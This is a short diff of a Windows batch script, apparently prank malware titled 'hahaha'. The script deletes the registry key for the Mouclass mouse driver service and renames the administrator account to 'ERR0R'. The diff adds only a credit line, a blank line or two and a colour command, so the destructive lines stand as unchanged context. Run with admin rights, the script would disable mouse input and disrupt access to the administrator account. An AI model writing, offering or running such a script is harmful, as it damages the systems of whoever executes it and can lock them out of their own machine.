@@ -1,5 +1,10 @@
+:: Created/Written By Unknown_69
+
 @echo off
+
 title hahaha
+color 02
+
 set key="HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesMouclass"
 reg delete %key%
 wmic useraccount where name='administrator' rename ERR0R
